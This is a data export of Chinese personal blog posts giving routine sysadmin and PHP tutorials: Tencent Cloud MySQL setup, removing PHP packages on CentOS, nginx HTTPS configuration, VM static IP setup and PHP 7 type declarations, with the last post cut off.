{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "腾讯云数据库", "log_Intro": "腾讯云数据库", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <div class=\"article-head\" style=\"color:rgba(0,0,0,.870588);\"><h1 style=\"line-height:30px;font-weight:200;text-align:center;color:rgb(126,136,139);\"><span style=\"font-family:SimSun;font-size:16px;\"><br></span></h1></div><div class=\"article-body\" style=\"line-height:1.7em;color:rgba(0,0,0,.870588);margin-left:auto;\"><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">1.领取或购买到腾讯云关系型数据库，根据你需要的数据库类型进行新建就会进入购买页<br><span><img alt=\"\" src=\"https://box.kancloud.cn/b82823b3edafb43829a2fed8379d064f_1399x409.png\" style=\"border:0px none;vertical-align:top;\"></span></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">2.刚购买的数据库都要进行初始化操作，就是点按钮选择你要的类型<br>3.对数据库进行管理，点击管理<br><img alt=\"\" src=\"https://box.kancloud.cn/8703c12b9dbb3a253c9952bb42538001_1221x183.png\" style=\"border:0px none;vertical-align:top;\"><br><img alt=\"\" src=\"https://box.kancloud.cn/e4305717c2e970e70e2e8ad17f0a0cfb_1187x629.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">4.忘记密码的可以在账号管理进行数据库密码重置，然后就是将我们需要的数据库文件导入，在数据库管理中新增数据库，将SQL文件导入，根据文件大小和网络上传速度等待时间有长短<br><img alt=\"\" src=\"https://box.kancloud.cn/a80529f9c59d18050f2a2b750d68e845_1220x680.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/88868236bd1d6a91ef13c7e525423390_1186x676.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">5.完成后可以通过登录按钮使用phpmyadmin查看数据内容<br>在 腾讯云控制台 中，依次单击【云产品】&gt;【关系型数据库】&gt;【MySQL】&gt;【实例列表】，选择状态为运行中的目标实例，点击【登录】。</span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">在数据管理控制台的登录界面，帐号输入 root，密码为之前在初始化选项中配置的 root 账户的密码，点击【登录】来登录。<br><img alt=\"\" src=\"https://box.kancloud.cn/507828b2732bcb9ff5b3dc6bfb94afe2_404x450.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">在数据管理页面可以查看实例的状态和基本信息。点击【返回PMA】访问数据库。<br><img alt=\"\" src=\"https://box.kancloud.cn/2c8c1b0961a71d6a66d21e850003380b_727x452.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">您现在已经通过 phpMyAdmin 成功连接到 MySQL 数据库，在此页面上您可以看到 MySQL 数据库的各种模式和对象，您可以开始创建表，进行数据插入和查询等操作。<br><img alt=\"\" src=\"https://box.kancloud.cn/7871a92de8f041afbb8b15bec64ac9b0_795x419.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">当然你可以直接在phpmyadmin操作数据导入导出等操作</span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\">5.同账号下同区的云服务器里面的项目需要访问云数据，只需要将访问数据库的配置文件修改成内网地址，以及账号密码写对就可以了</span></p><p style=\"line-height:1.7em;\"><span style=\"font-family:SimSun;font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/3f850ea2f167c514c630cb05a2d0acc4_835x645.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"line-height:1.7em;\"><br></p></div>                                    </div>", "log_PostTime": 1584891042, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOs下卸载程序", "log_Intro": "CentOs下卸载程序", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);\"><span style=\"font-family:SimSun;font-size:16px;\"><strong>centos系统下卸载PHP</strong><br>PHP -V 查询当前安装的php版本，使用yum remove php 命令卸载后，再PHP -v 还是可以查到PHP<br>接下来使用<br>rpm -qa|grep php 命令查看所有包，然后使用rpm -e 包名，依次卸载，如遇到卸载报错的那是因为卸载顺序不对，有些依赖关系需要按顺序卸载。我们看以下这个方法<br>查看php版本命令：<br>#php -v<br>下面的命令是删除不干净的<br>#yum remove php<br>因为使用这个命令以后再用<br>#php -v<br>还是会看到有版本信息的。。。。。</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);\"><span style=\"font-family:SimSun;font-size:16px;\">必须强制删除，使用下面命令查看全部php软件包<br>#rpm -qa|grep php<br>提示如下：<br>#php-pdo-5.1.6-27.el5_5.3<br>#php-mysql-5.1.6-27.el5_5.3<br>#php-xml-5.1.6-27.el5_5.3<br>#php-cli-5.1.6-27.el5_5.3<br>#php-common-5.1.6-27.el5_5.3<br>#php-gd-5.1.6-27.el5_5.3<br>注意卸载要先卸载没有依赖的<br>pdo是mysql的依赖项；common是gd的依赖项；<br>例如：# rpm -e php-pdo-5.1.6-27.el5_5.3<br>error: Failed dependencies:<br>php-pdo is needed by (installed) php-mysql-5.1.6-27.el5_5.3.i386<br>所以正确的卸载顺序是：<br>#rpm -e php-mysql-5.1.6-27.el5_5.3<br>#rpm -e php-pdo-5.1.6-27.el5_5.3<br>#rpm -e php-xml-5.1.6-27.el5_5.3<br>#rpm -e php-cli-5.1.6-27.el5_5.3<br>#rpm -e php-gd-5.1.6-27.el5_5.3<br>#rpm -e php-common-5.1.6-27.el5_5.3<br>再用<br>#php -v<br>查看版本信息已经没有提示</span></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);\"><span style=\"font-family:SimSun;font-size:16px;\">完全卸载<strong>mysql</strong>和卸载<strong>Apache</strong>也是一样的方法，先yum -y remove httpd和yum -y remove mysql，<br>然后再rpm -e 包名 依次卸载rpm -qa|grep httpd（或者mysql）查出来的包名，卸载顺序可以一个一个试出来</span></p>                                    </div>", "log_PostTime": 1584891043, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "腾讯云https认证", "log_Intro": "腾讯云https认证", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">1.准备好域名</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">2.登录腾讯云，在腾讯云找到ssL证书管理<br><img alt=\"\" src=\"https://box.kancloud.cn/0b6da3271f4d393e87f317e48ddeb6f5_1055x730.png\" style=\"border:0px none;vertical-align:top;\"></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">2.申请一个证书<br><img alt=\"\" src=\"https://box.kancloud.cn/d67ff443d2aa548e7b68fc27c4998835_699x193.png\" style=\"border:0px none;vertical-align:top;\"></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">选择1年免费版的<br><img alt=\"\" src=\"https://box.kancloud.cn/fd231e1c4f9b16b681e71fdf0bfd67f4_486x390.png\" style=\"border:0px none;vertical-align:top;\"></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">3.填写域名资料：<br>1、通用名称就是你的域名<br>2、申请邮箱填写你的常用邮箱<br>3、证书备注名：填写一个易记的就行<br>4、私钥密码：可不填写<br>6、所属项目：默认项目即可<br><img alt=\"\" src=\"https://box.kancloud.cn/9baff766b24db69cee79fc80eb598fe0_403x326.png\" style=\"border:0px none;vertical-align:top;\"><br>4.域名资料填写完成后，进入下一步，选择手动DNS验证。<br><img alt=\"\" src=\"https://box.kancloud.cn/7d7969afc6afbcbc1a7fb46d2ed35e62_414x279.png\" style=\"border:0px none;vertical-align:top;\"><br>将系统显示的CNAME解析值，解析到域名上。代解析完成后，点击自助诊断按钮，等待系统验证。比如，域名是在阿里云买的，在域名解析里添加一条TXT类型的解析，如下内容。<br><img alt=\"\" src=\"https://box.kancloud.cn/d2f11103037cadb4639a38b62d4d5996_1395x526.png\" style=\"border:0px none;vertical-align:top;\"><br><img alt=\"\" src=\"https://box.kancloud.cn/ef185350dd46e5d1889f57231943a220_515x236.png\" style=\"border:0px none;vertical-align:top;\"><br>申请通过后，进入SSL证书列表，将所申请的域名SSL证书下载到本地后，上传到你域名所在服务器即可<br><img alt=\"\" src=\"https://box.kancloud.cn/c5884e61c1d3ae01ca7b971ae9ba4f4e_542x122.png\" style=\"border:0px none;vertical-align:top;\"></p><h2 class=\"line\" style=\"font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;line-height:1.225;font-weight:200;font-size:1.75em;border-bottom:1px solid rgb(238,238,238);color:rgba(0,0,0,.870588);\"><a style=\"color:rgb(65,131,196);\"></a>nginx配置ssl证书</h2><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">拿到的证书分两个文件，一个是xxx.crt，一个是xxx.key，分别对应公钥和私钥。<br>1.假设我们的nginx安装目录是：/usr/local/nginx/，进入下面的conf目录，在conf目录下创建一个新目录，姑且命名为cert，把两个证书文件扔到此目录下。<br><img alt=\"\" src=\"https://box.kancloud.cn/03132db2b25a7ec5efa9d92e5a3deda9_228x316.png\" style=\"border:0px none;vertical-align:top;\"><br>2.编辑conf目录下的nginx.conf文件，当然，在编辑前最好先备份一下。我们找到类似下面的段：修改server{---}里面的内容<br><img alt=\"\" src=\"https://box.kancloud.cn/d840be94c3f3905ff7c432fe134a9687_536x280.png\" style=\"border:0px none;vertical-align:top;\"><br>3.如果只想让网站支持https访问，那么在server_name下面插入两行，添加两行内容：</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">listen 443;</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">ssl on;</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">4.如果想让网站兼容http和https访问，那么在server_name下面插入一行，添加一行内容：</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">listen 443 ssl</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">5.在root /home...（项目路径）下面再插入三行，添加内容：</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">ssl_certificate cert/xxx证书文件名1.crt;</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">ssl_certificate_key cert/xxx证书文件名2.key;</p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">ssl_session_timeout 5m;<br><img alt=\"\" src=\"https://box.kancloud.cn/3394a9e648bf47eb1f42eac8ca993ec1_569x489.png\" style=\"border:0px none;vertical-align:top;\"><br>6.编辑完成后，保存退出，执行命令nginx -t，测试下我们修改后的配置文件语法是否正确，如果正确将会输出如下提示：<br><img alt=\"\" src=\"https://box.kancloud.cn/36b1ef69f9cc38879d3187c4443e8f54_638x61.png\" style=\"border:0px none;vertical-align:top;\"></p><p style=\"line-height:1.7em;color:rgba(0,0,0,.870588);font-family:'Microsoft Yahei', 'Helvetica Neue', Arial, Helvetica, sans-serif;font-size:15.96px;\">step7.然后继续执行命令，nginx -s reload，重新加载配置文件。执行后，在浏览器中输入https的网址进行访问，如果地址栏边上有个小锁的标志，则证明升级成功，恭喜自己吧！</p>                                    </div>", "log_PostTime": 1584891044, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "虚拟机为cenots配置网络", "log_Intro": "虚拟机为cenots配置网络", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">在虚拟机上安装好了centos 7，发现不能像6.5版本那样选择一些网络即可上网。<br style=\"margin:.2em;\">必须修改系统的网络配置文件才可以上网<br style=\"margin:.2em;\">1.首先在虚拟机终端上<br style=\"margin:.2em;\">查看一下ip，用ifconfig命令可以查看到虚拟机的ip地址，网关等信息。<br style=\"margin:.2em;\">如图所示，观察图中内容，可以发现虚拟机的网关名称为ens33,而且没有ip地址。<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/f4df1910038dafb7f5f040540b91d95b_492x235.png\" style=\"border:0px none;vertical-align:top;\"></span><br style=\"margin:.2em;\">2.查看网络配置。网上使用cat /etc/sysconfig/network-scripts/ifcfg-ens33命令查看<br style=\"margin:.2em;\">我这边安装的是中文桌面版cenots7 可以直接打开文件夹，我的配置文件是中文的<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/6030e5515caf0002f95501f28e97b0e3_677x367.png\" style=\"border:0px none;vertical-align:top;\"></span><br style=\"margin:.2em;\">3.然后用vi /etc/sysconfig/network-scripts/ifcfg-ens33命令进入ifcfg-ens33文档，敲击a、i或o进入编辑模式，输入以下内容：<br style=\"margin:.2em;\">IPADDR0=192.168.75.131<br style=\"margin:.2em;\">PREFIX0=24<br style=\"margin:.2em;\">GATEWAY0=192.168.75.1<br style=\"margin:.2em;\">DNS1=192.168.75.1<br style=\"margin:.2em;\">(具体内容根据计算机网络中ip和网关知识自己设置即可）<br style=\"margin:.2em;\">然后需要把BOOTPROTO=phcp这一栏用#注释掉（这句话的意思是自动匹配ip地址）<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/dc0a7334b7d1299be2c5844ca1fa8489_365x311.png\" style=\"border:0px none;vertical-align:top;\"></span><br style=\"margin:.2em;\">我这边就直接打开编辑<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/85cbe70e5f76cdf8d0267af1f63ea7f8_651x360.png\" style=\"border:0px none;vertical-align:top;\"></span><br style=\"margin:.2em;\">4.然后重启网络服务。用/etc/init.d/network restart命令即可。<br style=\"margin:.2em;\">重启网络服务后，用ifconfig命令在查看以下ip地址。<br style=\"margin:.2em;\">5.ping <a href=\"http://www.baidu.com/\" rel=\"nofollow\" style=\"color:rgb(65,131,196);background-color:transparent;\">www.baidu.com</a><br style=\"margin:.2em;\">如果发现还是不能联通网络<br style=\"margin:.2em;\">检查你的虚拟机网络配置，还有就是你自己主机的网络配置<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/22af66f8e6889b03f7359e34764d54e8_675x561.png\" style=\"border:0px none;vertical-align:top;\"></span><br style=\"margin:.2em;\">你的配置子网IP必须和虚拟机系统上网络配置一个段，自定义的网络名称也必须一致<br style=\"margin:.2em;\"><span><img alt=\"\" src=\"https://box.kancloud.cn/eb95b02e16164a5db775e322a6e63822_680x468.png\" style=\"border:0px none;vertical-align:top;\"></span></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">最后</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">1.无线网络连接--属性--共享--选择打钩共享<br style=\"margin:.2em;\">2.自己主机上的虚拟网络必须是自动获取IP地址 （1/2顺序操作）<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/85a6751d683bba085787ac329eff3103_713x483.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/4cf412e60c68b02b767741f8203817b2_673x292.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">7，测试上网成功<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/aeb72c9346b65fafeda3952adcc3f325_704x327.png\" style=\"border:0px none;vertical-align:top;\"></span></p><h2 class=\"line\" style=\"padding:0px 0px .3em;line-height:1.225;margin-top:0px;margin-bottom:14px;font-weight:200;border-bottom:1px solid rgb(238,238,238);color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\"><a style=\"color:rgb(65,131,196);background-color:transparent;\"></a>如果使用自动分配IP也是可以的</span></h2><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">虚拟机网络配置如下</span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\"><img alt=\"\" src=\"https://box.kancloud.cn/812f72b2a106f44fbba5c0f1bae6c6d5_453x343.png\" style=\"border:0px none;vertical-align:top;\"><br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/247fa7afcaf090911715635aa8d52858_950x698.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:14px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">然后在虚拟机上 ifconfig 查询出当前获取的IP，然后就可以开始用工具进行访问配置了。<br style=\"margin:.2em;\"><img alt=\"\" src=\"https://box.kancloud.cn/2f342d157b7ae5a993181cbff585a01e_685x448.png\" style=\"border:0px none;vertical-align:top;\"></span></p><p style=\"margin-bottom:0px;line-height:1.7em;color:rgba(0,0,0,.870588);background-color:rgb(255,255,255);\"><span style=\"font-family:SimSun;font-size:16px;\">但是这种网络配置，IP可能会变，我的测试中，在搭建环境时突然虚拟机的网络断开了，导致无法工作中断，所以还是配置一个固定IP可靠一些</span></p>                                    </div>", "log_PostTime": 1584891046, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "PHP 7 新特性", "log_Intro": "PHP 7 新特性", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">标量类型声明</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">PHP 7 中的函数的形参类型声明可以是标量了。在 PHP 5 中只能是类名、接口、array 或者 callable (PHP 5.4，即可以是函数，包括匿名函数)，现在也可以使用 string、int、float和 bool 了。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n</span><span class=\"com\" style=\"border:0px;margin:0px;padding:0px;color:rgb(136,0,0);\">// 强制模式</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> sumOfInts</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">int</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">...</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$ints</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">return</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> array_sum</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$ints</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">);</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">}</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n\nvar_dump</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">sumOfInts</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">2</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"str\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,136,0);\">'3'</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">,</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">4.1</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">));</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">以上实例会输出：</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">int</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"lit\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,102,102);\">9</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">)</span></span></pre><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">需要注意的是上文提到的严格模式的问题在这里同样适用：强制模式（默认，既强制类型转换）下还是会对不符合预期的参数进行强制类型转换，严格模式下则触发 TypeError 的致命错误。</span></p><hr style=\"background-color:rgb(212,212,212);color:rgb(212,212,212);height:1px;border-width:0px;clear:both;font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><h2 style=\"border:0px;margin-top:2px;margin-bottom:2px;padding:0px;line-height:1.8em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">返回值类型声明</span></h2><p style=\"border:0px;margin-bottom:0px;line-height:2em;color:rgb(51,51,51);background-color:rgb(255,255,255);font-family:'Helvetica Neue', Helvetica, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', 'Noto Sans CJK SC', 'WenQuanYi Micro Hei', Arial, sans-serif;\"><span style=\"font-size:16px;\">PHP 7 增加了对返回类型声明的支持。 类似于参数类型声明，返回类型声明指明了函数返回值的类型。可用的类型与参数声明中可用的类型相同。</span></p><pre class=\"prettyprint prettyprinted\" style=\"border-width:1px 1px 1px 4px;border-style:solid;border-color:rgb(221,221,221);margin:15px auto;padding:10px 15px;white-space:pre-wrap;background:rgb(251,251,251) url(&quot;/images/codecolorer_bg.gif&quot;) center top;color:rgb(51,51,51);font-family:Menlo, Monaco, Consolas, 'Andale Mono', 'lucida console', 'Courier New', monospace;\"><span style=\"font-size:16px;\"><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">&lt;?</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">php\n\n</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> arraysSum</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">array </span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">...</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">$arrays</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">):</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> array\n</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">{</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">\n    </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">return</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> array_map</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">function</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">(</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\">array $array</span><span class=\"pun\" style=\"border:0px;margin:0px;padding:0px;color:rgb(102,102,0);\">):</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"kwd\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,136);\">int</span><span class=\"pln\" style=\"border:0px;margin:0px;padding:0px;color:rgb(0,0,0);\"> </span><span class=\"pun\" 